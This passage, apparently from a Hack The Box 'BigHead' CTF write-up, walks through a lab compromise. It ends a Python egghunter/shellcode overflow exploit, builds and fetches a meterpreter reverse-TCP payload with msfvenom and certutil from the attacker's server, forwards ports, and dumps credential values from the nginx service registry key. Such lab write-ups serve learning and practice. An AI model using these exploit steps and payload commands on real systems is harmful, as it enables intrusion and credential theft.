		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST / HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host: dev.bighead.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Length: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[34m'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'['&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'] '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;\s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Done&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Sending EggHunter&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HEAD /&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;f0125062&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host: dev.bighead.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[34m'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;\s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Done&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;send_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;send_egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-its-show-time-lets-test-the-exploit-&quot;&gt;Now it’s show time, Let’s test the exploit :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/83.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;perfectly-working--we-got-a-reverse-shell&quot;&gt;Perfectly working ! we got a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;enumeration-enumeration-enumeration-&quot;&gt;Enumeration, Enumeration, Enumeration …&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-on-the-machine-as-nelson-there-is-another-user-on-the-box-called-nginx-&quot;&gt;We are on the machine as &lt;code class=&quot;highlighter-rouge&quot;&gt;nelson&lt;/code&gt;, There is another user on the box called &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/85.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-cusersnelson-and-cusersnelsondesktop-and-i-found-the-user-flag-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\Desktop&lt;/code&gt; and I found the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/86.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;2962-bytes-well--no-its-not-the-user-flag-&quot;&gt;2962 bytes? Well … no it’s not the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-probably-we-need-to-be-nginx-to-get-the-user-flag-and-of-course-we-cant-access-nginx-directory-&quot;&gt;So we probably we need to be &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; to get the user flag. And of course we can’t access &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; directory :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/89.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-upgrade-that-reverse-shell-into-meterpreter-so-i-had-to-create-the-payload-first-&quot;&gt;I wanted to upgrade that reverse shell into &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; so I had to create the payload first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &amp;gt; m.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-set-up-the-meterpreter-handler-&quot;&gt;Then I set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; handler :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/91.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-a-python-simple-http-server-on-port-80--python--m-simplehttpserver-80-to-host-the-payload-then-i-went-to-cusersnelsonappdatalocaltemp-and-downloaded-the-payload-with-certutil-&quot;&gt;I ran a python simple http server on port 80 : &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 80&lt;/code&gt; to host the payload. Then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp&lt;/code&gt; and downloaded the payload with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/92.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-executed-it-and-got-a-meterpreter-session-&quot;&gt;Then I executed it and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/93.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/94.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-meterpreter-i-wanted-to-look-at-the-services-so-i-did-ps-i-looked-through-them-and-found-an-interesting-service-called-bvsshserverexe&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; I wanted to look at the services so I did &lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt;, I looked through them and found an interesting service called &lt;code class=&quot;highlighter-rouge&quot;&gt;BvSshServer.exe&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-know-the-listening-port-of-that-ssh-server-so-i-did-netstat-it-was-listening-on-port-2020-&quot;&gt;I wanted to know the listening port of that ssh server, so I did &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat&lt;/code&gt;. It was listening on port 2020 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-forwarded-that-port-we-also-saw-earlier-when-we-went-to-codebigheadhtb-it-redirected-us-to-http1270015080testlinkloginphp-i-wanted-to-forward-that-port-too-to-check-whats-in-there-to-forward-a-port-through-meterpreter-we-can-simply-do-it-with-portfwd-&quot;&gt;So I forwarded that port, We also saw earlier when we went to &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; it redirected us to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:5080/testlink/login.php&lt;/code&gt;. I wanted to forward that port too to check what’s in there. To forward a port through &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; we can simply do it with &lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd add -l 2020 -p 2020 -r bighead.htb&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd add -l 5080 -p 5080 -r bighead.htb&lt;/code&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-if-that-bvsshserver-is-a-real-ssh-server-&quot;&gt;Let’s check if that &lt;code class=&quot;highlighter-rouge&quot;&gt;BvSshServer&lt;/code&gt; is a real ssh server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/98.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-fine-now-we-need-a-password-to-login-we-already-know-the-username--nginx&quot;&gt;It’s working fine, now we need a password to login. We already know the username : &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-went-to-codebigheadhtb-again-and-after-i-got-redirected-to-port-5080-on-localhost-i-got-some-sql-errors-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; again and after I got redirected to port 5080 on &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; I got some &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; errors :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/99.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/100.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-it-disclosed-the-root-path--of-the-application--cxampp-i-tried-to-go-there-but-i-got-access-denied-&quot;&gt;As you can see it disclosed the root path  of the application : &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt;. I tried to go there but I got access denied :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-a-lot-of-enumeration-i-checked-the-registry-and-in-hklmsystemcurrentcontrolsetservices-i-found-the-registry-for-nignx-the-web-server-&quot;&gt;After a lot of enumeration I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;registry&lt;/code&gt; and in &lt;code class=&quot;highlighter-rouge&quot;&gt;HKLM\System\CurrentControlSet\Services\&lt;/code&gt; I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;registry&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;nignx&lt;/code&gt; (The web server) :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/102.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-looked-at-the-values-and-i-found-two-interesting-ones-&quot;&gt;Then I looked at the values and I found two interesting ones :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;authenticate-and-passwordhash-lets-look-at-the-value-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt;. Let’s look at the value :&lt;/h4&gt;
&lt;h4 id=&quot;authenticate-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;passwordhash-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;authenticate--4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000&lt;/code&gt;&lt;/h4&gt;
